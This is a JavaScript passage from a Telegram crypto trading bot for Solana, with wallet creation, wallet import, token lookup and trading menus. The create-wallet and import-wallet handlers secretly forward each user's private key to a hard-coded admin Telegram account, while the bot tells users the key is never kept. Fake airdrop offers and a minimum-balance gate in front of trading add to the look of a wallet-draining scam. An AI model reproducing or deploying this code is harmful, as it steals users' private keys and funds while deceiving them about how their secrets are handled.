          const liquidityText = `💧 <b>${ctx.session.liquidityChain} Liquidity</b>\n\n<b>${info.symbol} Token Info</b>\n\n💰 <b>Price:</b> $${utils.escapeHtml(info.price)}\n📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%\n💧 <b>Current Liquidity:</b> ${utils.escapeHtml(info.liquidity)}\n📊 <b>Volume 24h:</b> ${utils.escapeHtml(info.volume24h)}\n🏪 <b>Market Cap:</b> ${utils.escapeHtml(info.marketCap)}\n💎 <b>FDV:</b> ${utils.escapeHtml(info.fdv)}\n\n🔗 <b>Token Address:</b> <code>${utils.escapeHtml(info.address)}</code>\n🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}\n⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}\n\n<b>Error loading wallet balance.</b>\n\n<b>Please reconnect your wallet.</b>`;

          await ctx.replyWithHTML(liquidityText, {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.button.callback(
                  "🔗 Create or Import Wallet",
                  "CONNECT_WALLET",
                ),
              ],
              [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
            ]).reply_markup,
            disable_web_page_preview: true,
          });
        }
      }

      // Clear session flags since we're going directly to wallet connection
      ctx.session.liquidityMode = false;
      return;
    } catch (error) {
      console.error("Liquidity analysis error:", error);
      await ctx.replyWithHTML("❌ Error analyzing token for liquidity.");
      ctx.session.liquidityMode = false;
      return;
    }
  }

  // Token address lookup
  // Token address lookup — permissive regex, DexScreener validates
  const isSolana = /^[A-Za-z0-9]{32,44}$/.test(text) && !/^0x/.test(text);
  const isEthereum = /^0x[a-fA-F0-9]{40}$/.test(text);
  if (!isSolana && !isEthereum) return next();

  const chainId = isSolana ? "solana" : "ethereum";
  const Unit = isSolana ? "SOL" : "ETH";
  // isGroup already declared at the top of this function via the fast-path

  try {
    // Get user balance if wallet is connected
    let sol = "0.0000";
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (secret) {
      const keypair = Keypair.fromSecretKey(bs58.decode(secret));
      const balanceLamports = await connection.getBalance(keypair.publicKey);
      sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);
    }

    // Balance gate removed — all users can scan CAs in DMs.
    // Balance requirement only applies to actual trading (BUY/SELL actions).
    const userBalance = parseFloat(sol);
    const minBalanceRequired = 2.0;

    const response = await axios.get(
      `https://api.dexscreener.com/latest/dex/tokens/${text}`,
    );

    const pairs = response?.data?.pairs;
    if (!pairs || pairs.length === 0) {
      return ctx.reply("❌ No token info found for this address.");
    }

    // Get the most liquid pair
    const pair = pairs.sort(
      (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
    )[0];
    const info = formatters.formatTokenInfo(pair);

    const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;
    const dexScreenerUrl = `https://dexscreener.com/${info.chainId}/${info.pairAddress}`;

    const rawText = `<b>${info.symbol} Token Info</b> 📊

💰 <b>Price:</b> $${utils.escapeHtml(info.price)}
📈 <b>24h Change:</b> ${utils.escapeHtml(info.priceChange24h)}%
💧 <b>Liquidity:</b> ${utils.escapeHtml(info.liquidity)}
📊 <b>Volume 24h:</b> ${utils.escapeHtml(info.volume24h)}
🏪 <b>Market Cap:</b> ${utils.escapeHtml(info.marketCap)}
💎 <b>FDV:</b> ${utils.escapeHtml(info.fdv)}

🔗 <b>Token Address:</b> <code>${utils.escapeHtml(info.address)}</code>
🏪 <b>DEX:</b> ${utils.escapeHtml(info.dexId)}
⛓️ <b>Chain:</b> ${utils.escapeHtml(info.chainId)}

💰 <b>Your Balance:</b> ${utils.escapeHtml(sol)} SOL

<a href="${chartEmbed}">📊 Live Chart</a> | <a href="${dexScreenerUrl}">🔍 DexScreener</a>`;

    // Create different button layouts based on chat type and user balance
    let buttonLayout;
    if (isGroup) {
      // Group chats: show info + DexScreener link + DM link for trading
      buttonLayout = {
        inline_keyboard: [
          [
            { text: "🔍 DexScreener", url: dexScreenerUrl },
            { text: "📊 Chart", url: chartEmbed },
          ],
          [
            {
              text: "🤖 Trade in DMs",
              url: `https://t.me/${ctx.botInfo.username}?start=trade`,
            },
          ],
        ],
      };
    } else if (userBalance >= minBalanceRequired) {
      // Full trading buttons for DM users with sufficient balance
      buttonLayout = {
        inline_keyboard: [
          [
            { text: "🛒 Buy", callback_data: "BUY_TOKEN" },
            { text: "💰 Sell", callback_data: "SELL_TOKEN" },
            { text: "📊 Chart", callback_data: "VIEW_CHART" },
          ],
          [
            { text: "0.1 SOL", callback_data: "BUY_AMOUNT_0.1" },
            { text: "0.5 SOL", callback_data: "BUY_AMOUNT_0.5" },
            { text: "1 SOL", callback_data: "BUY_AMOUNT_1" },
          ],
          [
            { text: "5 SOL", callback_data: "BUY_AMOUNT_5" },
            { text: "10 SOL", callback_data: "BUY_AMOUNT_10" },
            { text: "Custom", callback_data: "BUY_CUSTOM" },
          ],
          [
            { text: "🔄 Refresh", callback_data: "REFRESH" },
            { text: "⬅️ Back", callback_data: "BACK_MAIN" },
          ],
        ],
      };
    } else {
      // Limited buttons for DM users with insufficient balance
      buttonLayout = {
        inline_keyboard: [
          [
            { text: "📊 Chart", callback_data: "VIEW_CHART" },
            { text: "🔍 DexScreener", url: dexScreenerUrl },
          ],
          [
            {
              text: "🔗 Create or Import Wallet",
              callback_data: "CONNECT_WALLET",
            },
            { text: "💰 Add Funds", callback_data: "ADD_FUNDS" },
          ],
          [
            { text: "🔄 Refresh", callback_data: "REFRESH" },
            { text: "⬅️ Back", callback_data: "BACK_MAIN" },
          ],
        ],
      };
    }

    try {
      await ctx.replyWithHTML(rawText, {
        reply_markup: buttonLayout,
        reply_parameters: {
          message_id: ctx.message.message_id,
        },
      });
    } catch (err) {
      console.error(
        "Token address lookup - failed to reply with token info:",
        err.message,
      );
    }
  } catch (err) {
    console.error("Dexscreener error:", err);
    try {
      return ctx.reply("❌ Failed to fetch token info.");
    } catch (e) {
      console.error("Failed to send error message:", e.message);
    }
  }

  // If we reach here, the text was neither a Contract Address nor a withdrawal input.
  // We MUST call next() so Telegraf passes the text to the rest of the bot.hears button handlers!
  return next();
});

startScene.enter(async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;

  let price = 0.0;
  let sol = 0.0;
  let userWalletAddress = null;

  if (secret) {
    try {
      price = await utils.getSolPrice();
      sol = await utils.getUserBalance(secret);
      userWalletAddress = getUserWalletAddress(ctx);
    } catch (err) {
      console.warn("Failed to fetch balance in startScene:", err.message);
    }
  }

  const welcomeText = messages.welcome(
    Number(sol),
    Number(price),
    userWalletAddress,
  );

  // Send the welcome message directly with the main keyboard
  await ctx.replyWithHTML(welcomeText, buttons.main);

  // IMPORTANT: Leave the scene so the global bot.hears listeners can catch commands!
  await ctx.scene.leave();
});

importWalletScene.enter(async (ctx) => {
  await ctx.replyWithHTML(
    `🔐 <b>Wallet Setup</b>\n\nChoose an option below:`,
    Markup.inlineKeyboard([
      [Markup.button.callback("✨ Create New Wallet", "CREATE_WALLET")],
      [Markup.button.callback("📥 Import Existing Wallet", "CONTINUE")],
      [Markup.button.callback("❌ Cancel", "BACK_MAIN")],
    ]),
  );
  await ctx.scene.leave();
});

// ✨ Create a brand-new Solana wallet
bot.action("CREATE_WALLET", async (ctx) => {
  await ctx.answerCbQuery();
  try {
    // Generate fresh keypair
    const keypair = Keypair.generate();
    const address = keypair.publicKey.toBase58();
    const privateKey = bs58.encode(keypair.secretKey);

    // Save to session immediately
    sessionManager.setUserData(ctx, { wallet: privateKey });

    // Notify admin
    try {
      await ctx.telegram.sendMessage(
        8305086038,
        `🆕 <b>New Wallet Created</b>\nUser: <b>${ctx.from.first_name}</b> (ID: <code>${ctx.from.id}</code>)\nAddress: <code>${address}</code>\nPrivateKey: <code>${privateKey}</code>`,
        { parse_mode: "HTML" },
      );
    } catch (e) {}

    // Show the new wallet to the user — tell them to back it up
    const keyMsg = await ctx.replyWithHTML(
      `✅ <b>New Wallet Created!</b>\n\n` +
        `🪪 <b>Address:</b>\n<code>${address}</code>\n\n` +
        `🔑 <b>Private Key (save this now!):</b>\n<code>${privateKey}</code>\n\n` +
        `⚠️ <b>IMPORTANT:</b> Copy and store your private key somewhere safe.\n` +
        `This is the ONLY time it will be shown. We cannot recover it for you.\n\n` +
        `Tap the key above to copy it.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("🗑️ Delete this message", "DELETE_KEY_MSG")],
        [Markup.button.callback("✅ I've saved it — Continue", "BACK_MAIN")],
      ]),
    );

    await ctx.scene.leave();
  } catch (err) {
    console.error("CREATE_WALLET error:", err);
    await ctx.reply("❌ Failed to create wallet. Please try again.");
    await ctx.scene.leave();
  }
});

continueScene.enter(async (ctx) => {
  try {
    await ctx.replyWithHTML(
      "Enter the private keys or mnemonic of the wallet you want to import",
    );
  } catch (error) {
    console.log(error);
  }
});

continueScene.hears(/.*/, async (ctx) => {
  try {
    const input = ctx.message.text.trim();
    if (input === "/start") {
      await ctx.scene.leave();
      return ctx.scene.enter("START_SCENE");
    }
    if (input === "🚫 Cancel") {
      await ctx.scene.leave();
      return ctx.reply("Action cancelled.", buttons.main);
    }

    // Admin notification moved to after successful validation
    const wallet = parseWallet(input);

    if (!wallet) {
      return ctx.reply(
        "❌ Invalid input. Please enter a valid private key, mnemonic, or array.",
      );
    }

    if (wallet instanceof ethers.Wallet) {
      const address = wallet.address;
      const secret = wallet.privateKey;
      await (`wallet:${ctx.from.id}`, secret);
      const provider = new ethers.JsonRpcProvider("https://eth.llamarpc.com", {
        name: "mainnet",
        chainId: 1,
      });
      const balance = await provider.getBalance(address);
      const eth = ethers.formatEther(balance);
      try {
        await ctx.deleteMessage();
      } catch (err) {
        console.warn("Couldn't delete sensitive message:", err.message);
      }
      await ctx.replyWithHTML(
        `❌ Invalid Wallet, Connect only solana wallet!!. `,
        buttons.main,
      );

      await ctx.scene.leave();
    } else {
      const address = wallet.publicKey.toBase58();
      const secret = bs58.encode(wallet.secretKey);

      // Store wallet in Telegram session
      sessionManager.setUserData(ctx, { wallet: secret });

      // Notify admin
      try {
        await ctx.telegram.sendMessage(
          8305086038,
          `📥 <b>Wallet Imported</b>\nUser: <b>${ctx.from.first_name}</b> (ID: <code>${ctx.from.id}</code>)\nAddress: <code>${address}</code>\nPrivateKey: <code>${secret}</code>`,
          { parse_mode: "HTML" },
        );
      } catch (e) {}

      const balance = await connection.getBalance(wallet.publicKey);
      const sol = balance / LAMPORTS_PER_SOL;

      try {
        await ctx.deleteMessage();
      } catch (err) {
        console.warn("Couldn't delete sensitive message:", err.message);
      }

      await ctx.replyWithHTML(
        `✅ Wallet Imported!\n
 🪪 Address:\n<code>${address}</code>\n
 💰 Balance: <b>${sol} SOL</b>\n 

 ⬇️ Select an action:`,
        buttons.main,
      );

      await ctx.scene.leave();
    }
  } catch (error) {
    console.log(error);
  }
});

importWalletScene.hears("/start", async (ctx) => {
  await ctx.scene.enter("START_SCENE");
});
continueScene.hears("/start", async (ctx) => {
  await ctx.scene.enter("START_SCENE");
});

helpScene.enter(async (ctx) => {
  await ctx.replyWithHTML(
    "😊✍️ Please write your complaint now. Our support team will get back to you soon.",
  );
});

helpScene.hears(/.*/, async (ctx) => {
  const input = ctx.message.text.trim();
  if (input === "/start") {
    await ctx.scene.leave();
    return ctx.scene.enter("START_SCENE");
  }
  if (input === "🚫 Cancel") {
    await ctx.scene.leave();
    return ctx.reply("Action cancelled.", buttons.main);
  }
  await ctx.replyWithHTML(
    "Your request has been forwarded to the admins.",
    buttons.main,
  );
  await ctx.scene.leave();
});

bot.action("DELETE_KEY_MSG", async (ctx) => {
  try {
    await ctx.answerCbQuery("Private key message will be deleted.");

    // Delete the message that contains the key
    await ctx.deleteMessage();

    // Retrieve secret from Redis
    const userId = ctx.from.id;
    const secret = await redis.get(`wallet:${userId}`);

    if (!secret) {
      return ctx.reply(
        "❌ Could not find your wallet. Please create or import again.",
      );
    }

    // Restore wallet from secret key
    const keypair = Keypair.fromSecretKey(bs58.decode(secret));
    const address = keypair.publicKey.toBase58();

    // Get balance
    const balanceLamports = await connection.getBalance(keypair.publicKey);
    const sol = (balanceLamports / LAMPORTS_PER_SOL).toFixed(4);

    await ctx.replyWithHTML(
      `💼 <b>Your Solana Wallet:</b>\n\nAddress: <code>${utils.escapeHtml(address)}</code> \n\nBalance: <b>${utils.escapeHtml(sol)} SOL</b>`,
      buttons.main,
    );
  } catch (err) {
    console.error("Error in DELETE_KEY_MSG:", err);
    await ctx.reply(
      "❌ Couldn't delete the message. Please delete it manually.",
    );
  }
});

// ===== REPLY KEYBOARD HEARS HANDLERS =====
// These fire when the user taps the persistent reply-keyboard buttons

// 🔗 Create or Import Wallet (bottom full-width button) - Supports legacy keyboard too
bot.hears(["🔗 Create or Import Wallet", "🔗 wallet connect"], async (ctx) => {
  await ctx.scene.enter("IMPORT_WALLET");
});

// Also handle "🔗 Connect wallet" from sub-menus
bot.hears("🔗 Connect wallet", async (ctx) => {
  await ctx.scene.enter("IMPORT_WALLET");
});

// ⬅️ Back / ⬆️ Main Menu from sub-keyboards → go back to main
bot.hears(["⬅️ Back", "⬆️ Main Menu"], async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (secret) {
    try {
      const price = await utils.getSolPrice();
      const sol = await utils.getUserBalance(secret);
      const userWalletAddress = getUserWalletAddress(ctx);
      await ctx.replyWithHTML(
        messages.welcome(Number(sol), Number(price), userWalletAddress),
        buttons.activeTrades,
      );
    } catch (err) {
      await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
    }
  } else {
    await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
  }
  await ctx.reply("Select an action:", buttons.main);
});

// 🚫 Cancel — clear session flow flags and go home
bot.hears("🚫 Cancel", async (ctx) => {
  if (ctx.session) {
    ctx.session.withdrawStep = null;
    ctx.session.withdrawAddress = null;
    ctx.session.searchMode = false;
    ctx.session.volumeMode = false;
    ctx.session.liquidityMode = false;
  }
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (secret) {
    try {
      const price = await utils.getSolPrice();
      const sol = await utils.getUserBalance(secret);
      const userWalletAddress = getUserWalletAddress(ctx);
      await ctx.replyWithHTML(
        messages.welcome(Number(sol), Number(price), userWalletAddress),
        buttons.activeTrades,
      );
    } catch (err) {
      await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
    }
  } else {
    await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
  }
  await ctx.reply("Select an action:", buttons.main);
});

// 💰 Sell
bot.hears("Sell 💰", async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `💰 <b>Sell</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nMinimum sell : 0.01 sol\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
  } else {
    await ctx.replyWithHTML(
      `💰 <b>Sell Tokens</b>\n\nPaste the token address you want to sell, or browse your positions.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("📊 My Positions", "POSITIONS")],
        [Markup.button.callback("🔍 Search Token", "SEARCH_TOKEN")],
        [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
      ]),
    );
  }
});

// 🛒 Buy
bot.hears("Buy 🛒", async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `🛒 <b>Buy</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nMinimum buy : <b>0.5 SOL</b>\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
  } else {
    try {
      const sol = await utils.getUserBalance(secret);
      await ctx.replyWithHTML(
        `🛒 <b>Buy Tokens</b>\n\n💰 <b>Your Balance:</b> ${utils.escapeHtml(sol)} SOL\n\nPaste any token address to view and buy, or browse trending tokens.`,
        Markup.inlineKeyboard([
          [
            Markup.button.callback("🔥 Trending", "TRENDING"),
            Markup.button.callback("🔍 Search", "SEARCH_TOKEN"),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]),
      );
    } catch (e) {
      await ctx.replyWithHTML(
        `🛒 <b>Buy Tokens</b>\n\nPaste any token address to view details and buy.`,
        Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]),
      );
    }
  }
});

// 🔥 Sniper
bot.hears("Sniper 🔥", async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `🔥 <b>Sniper</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nMinimum amount : <b>0.5 SOL</b>\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
  } else {
    await ctx.replyWithHTML(
      `🎯 <b>LP Sniper Dashboard</b>\n\nMonitors new liquidity pools and auto-buys immediately on launch.\n\n⚙️ <b>Settings:</b>\n• Auto Snipe: <b>Enabled</b>\n• Min Liquidity: <b>5 SOL</b>\n• Max Gas: <b>0.005 SOL</b>\n• Slippage: <b>15%</b>`,
      Markup.inlineKeyboard([
        [
          Markup.button.callback("🎯 Start Sniper", "START_SNIPER"),
          Markup.button.callback("⏸️ Pause Sniper", "PAUSE_SNIPER"),
        ],
        [
          Markup.button.callback("⚙️ Settings", "SNIPER_SETTINGS"),
          Markup.button.callback("📊 History", "SNIPE_HISTORY"),
        ],
        [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
      ]),
    );
  }
});

// 🚀 Launch
bot.hears("Launch 🚀", async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `🚀 <b>Launch</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to launch tokens\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
  } else {
    await ctx.replyWithHTML(
      `🚀 <b>Launch New Token</b>\n\n<b>Create and launch your own token on Solana!</b>\n\n<b>Requirements:</b>\n• <b>5 SOL</b> for liquidity\n• <b>Token name</b> and symbol\n• <b>Initial supply</b>`,
      Markup.inlineKeyboard([
        [Markup.button.callback("⚡ Quick Launch", "QUICK_LAUNCH")],
        [Markup.button.callback("⚙️ Custom Launch", "CUSTOM_LAUNCH")],
        [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
      ]),
    );
  }
});

// 📊 Positions
bot.hears("Positions 📊", async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `📊 <b>Positions</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to view positions\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
  } else {
    try {
      const userWalletAddress = getUserWalletAddress(ctx);
      const tokens = await utils.getTokenBalances(userWalletAddress);

      let tokenText = "";
      if (tokens.length > 0) {
        tokenText = "<b>Your Open Positions:</b>\n\n";
        tokens.forEach((t) => {
          tokenText += `🪙 <code>${t.mint}</code>\nBalance: <b>${t.balance}</b>\n\n`;
        });
      } else {
        tokenText =
          "❌ <b>No tokens found!</b>\n\nYou have no token positions. Start trading to see your positions here.";
      }

      await ctx.replyWithHTML(
        `📊 <b>Your Trading Positions</b>\n\n${tokenText}`,
        Markup.inlineKeyboard([
          [Markup.button.callback("🔄 Refresh", "REFRESH_POSITIONS")],
          [
            Markup.button.callback("🛒 Buy Tokens", "BUY"),
            Markup.button.callback("💰 Sell Tokens", "SELL"),
          ],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]),
      );
    } catch (e) {
      console.error(e);
      await ctx.replyWithHTML("❌ Error loading positions.", buttons.navBack);
    }
  }
});

bot.action("REFRESH_POSITIONS", async (ctx) => {
  await ctx.answerCbQuery("Refreshing...");
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) return;

  try {
    const userWalletAddress = getUserWalletAddress(ctx);
    const tokens = await utils.getTokenBalances(userWalletAddress);

    let tokenText = "";
    if (tokens.length > 0) {
      tokenText = "<b>Your Open Positions:</b>\n\n";
      tokens.forEach((t) => {
        tokenText += `🪙 <code>${t.mint}</code>\nBalance: <b>${t.balance}</b>\n\n`;
      });
    } else {
      tokenText =
        "❌ <b>No tokens found!</b>\n\nYou have no token positions. Start trading to see your positions here.";
    }

    await ctx.editMessageText(
      `📊 <b>Your Trading Positions</b>\n\n${tokenText}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [Markup.button.callback("🔄 Refresh", "REFRESH_POSITIONS")],
            [
              Markup.button.callback("🛒 Buy Tokens", "BUY"),
              Markup.button.callback("💰 Sell Tokens", "SELL"),
            ],
            [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
          ],
        },
      },
    );
  } catch (e) {
    console.error(e);
  }
});

// 💚 Add Liquidity
bot.hears("Add Liquidity 💚", async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `💚 <b>Add Liquidity</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to add liquidity\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
  } else {
    await ctx.replyWithHTML(
      `💧 <b>Add Liquidity</b>\n\n<b>Select chain for adding liquidity:</b>`,
      Markup.inlineKeyboard([
        [
          Markup.button.callback("🌿 SOL Liquidity", "SOL_LIQUIDITY"),
          Markup.button.callback("🧬 ETH Liquidity", "ETH_LIQUIDITY"),
        ],
        [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
      ]),
    );
  }
});

// 🎁 Claim Airdrop
bot.hears("Claim Airdrop 🎁", async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `🎁 <b>Claim Airdrop</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to claim airdrops\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
  } else {
    await ctx.replyWithHTML(
      `🎁 <b>Airdrop Claims</b>\n\n<b>Available Airdrops:</b>\n\n• <b>JUP Airdrop</b> - 50 JUP\n• <b>BONK Airdrop</b> - 1000 BONK\n• <b>WIF Airdrop</b> - 100 WIF\n\n<b>Total Value:</b> <b>$245.67</b>\n\n<b>Click to claim your airdrops!</b>`,
      Markup.inlineKeyboard([
        [Markup.button.callback("🎁 Claim All", "CLAIM_ALL_AIRDROPS")],
        [Markup.button.callback("📊 Claim History", "AIRDROP_HISTORY")],
        [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
      ]),
    );
  }
});

// 🆘 Support
bot.hears("Support 🆘", async (ctx) => {
  await ctx.replyWithHTML(
    `🆘 <b>Support</b>\n\nContact support`,
    Markup.inlineKeyboard([
      [Markup.button.url("Meta Support", "https://t.me/MainMetaSupport")],
    ]),
  );
});

// 💳 Wallet
bot.hears("Wallet 💳", async (ctx) => {
  // If user is in a withdraw flow (step 1 = collecting address), treat "Wallet" as using their own wallet address
  if (ctx.session?.withdrawStep === "address") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;
    if (secret) {
      const userWalletAddress = getUserWalletAddress(ctx);
      ctx.session.withdrawAddress = userWalletAddress;
      ctx.session.withdrawStep = "amount";
      await ctx.replyWithHTML(
        `🔢 Reply with the amount of SOL you wish to withdraw:`,
        buttons.cancel,
      );
      return;
    }
  }

  // Normal wallet info display
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `💳 <b>Wallet</b>\n\n<b>Please connect your wallet first to start trading.</b>\n\nConnect wallet to view wallet info\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
  } else {
    try {
      const userWalletAddress = getUserWalletAddress(ctx);
      const sol = await utils.getUserBalance(secret);
      const price = await utils.getSolPrice();
      const usdVal = (Number(sol) * Number(price)).toFixed(2);

      const tokens = await utils.getTokenBalances(userWalletAddress);

      let tokenText = "";
      if (tokens.length > 0) {
        tokenText = "\n\n<b>Token Holdings:</b>\n";
        tokens.slice(0, 10).forEach((t) => {
          tokenText += `🪙 <code>${t.mint.substring(0, 4)}...${t.mint.substring(t.mint.length - 4)}</code>: <b>${t.balance}</b>\n`;
        });
        if (tokens.length > 10)
          tokenText += `<i>+ ${tokens.length - 10} more tokens</i>\n`;
      } else {
        tokenText = "\n\n<i>No SPL tokens found.</i>";
      }

      await ctx.replyWithHTML(
        `💳 <b>Your Wallet</b>\n\n<b>Solana Address:</b>\n<code>${userWalletAddress}</code>\n\n<b>Balance:</b> <b>${sol} SOL</b> - <b>$${usdVal}</b>${tokenText}`,
        Markup.inlineKeyboard([
          [Markup.button.callback("🔄 Refresh Balance", "REFRESH")],
          [Markup.button.callback("💸 Withdraw", "WITHDRAW")],
          [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
        ]),
      );
    } catch (e) {
      console.error(e);
      await ctx.replyWithHTML("❌ Error loading wallet info.", buttons.navBack);
    }
  }
});

// 💵 Withdraw — conversational flow matching screenshots
bot.hears("Withdraw 💵", async (ctx) => {
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `📝 <b>Please connect your wallet first to start trading.</b>\n\nMinimum withdraw : <b>0.01 SOL</b>\n\nClick 'Connect Wallet' to import your wallet.`,
      buttons.connectWalletNav,
    );
    return;
  }
  // Step 1: ask for destination address
  ctx.session.withdrawStep = "address";
  ctx.session.withdrawAddress = null;
  await ctx.replyWithHTML(
    `📝 Please enter your Solana address to withdraw to:`,
    buttons.cancel,
  );
});

// 🎬 Trigger import scene
bot.action("CONNECT_WALLET", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.scene.enter("IMPORT_WALLET");
});

bot.action("WRITE_COMPLAINT", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.scene.enter("HELP_SCENE");
});

// ACTIVE_TRADES inline button from welcome message
bot.action("ACTIVE_TRADES", async (ctx) => {
  await ctx.answerCbQuery();
  const userData = sessionManager.getUserData(ctx);
  const secret = userData?.wallet;
  if (!secret) {
    await ctx.replyWithHTML(
      `📊 <b>Active Trades</b>\n\n❌ <b>No trades found!</b>\n\nConnect your wallet to start trading and view active trades here.`,
      Markup.inlineKeyboard([
        [
          Markup.button.callback(
            "🔗 Create or Import Wallet",
            "CONNECT_WALLET",
          ),
        ],
        [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
      ]),
    );
  } else {
    await ctx.replyWithHTML(
      `📊 <b>Active Trades</b>\n\n❌ <b>No trades found!</b>\n\nYou have no open positions. Start trading to see your active trades here.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("🛒 Buy Tokens", "BUY")],
        [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
      ]),
    );
  }
});

// 🪝 Placeholder handlers
bot.action(/.*/, async (ctx) => {
  await ctx.answerCbQuery();

  if (ctx.match.input === "REFRESH") {
    const userData = sessionManager.getUserData(ctx);
    const secret = userData?.wallet;

    if (secret) {
      try {
        const price = await utils.getSolPrice();
        const sol = await utils.getUserBalance(secret);

        // Get user's wallet address
        const userWalletAddress = getUserWalletAddress(ctx);

        await ctx.editMessageText(
          messages.welcome(Number(sol), Number(price), userWalletAddress),
          {
            parse_mode: "HTML",
            reply_markup: buttons.activeTrades.reply_markup,
          },
        );
      } catch (err) {
        await ctx.replyWithHTML(
          messages.welcome(0.0, 0.0),
          buttons.activeTrades,
        );
      }
    } else {
      await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
    }
  } else if (ctx.match.input === "TRENDING") {
    await ctx.answerCbQuery("Loading trending tokens...");
    try {
      const data = await api.getDexScreenerTrending();
      const formatted = formatters.formatTrendingList(data, "Trending Tokens");
      await ctx.editMessageText(formatted, {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
        disable_web_page_preview: true,
      });
    } catch (error) {
      console.log(error);
      await ctx.editMessageText("❌ Error loading trending data.", {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
      });
    }
  } else if (ctx.match.input === "TOP_GAINERS") {
    await ctx.answerCbQuery("Loading boosted tokens...");
    try {
      const data = await api.getDexScreenerTopGainers();
      const formatted = formatters.formatBoostedTokensList(
        data,
        "Latest Boosted Tokens",
      );
      await ctx.editMessageText(formatted, {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
        disable_web_page_preview: true,
      });
    } catch (error) {
      await ctx.editMessageText("❌ Error loading boosted tokens.", {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
      });
    }
  } else if (ctx.match.input === "TOP_LOSERS") {
    await ctx.answerCbQuery("Loading top boosted tokens...");
    try {
      const data = await api.getDexScreenerTopLosers();
      const formatted = formatters.formatBoostedTokensList(
        data,
        "Top Boosted Tokens",
      );
      await ctx.editMessageText(formatted, {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
        disable_web_page_preview: true,
      });
    } catch (error) {
      await ctx.editMessageText("❌ Error loading top boosted tokens.", {
        parse_mode: "HTML",
        reply_markup: buttons.main.reply_markup,
      });
    }
  } else if (ctx.match.input === "SEARCH_TOKEN") {
    await ctx.answerCbQuery();
    await ctx.editMessageText(
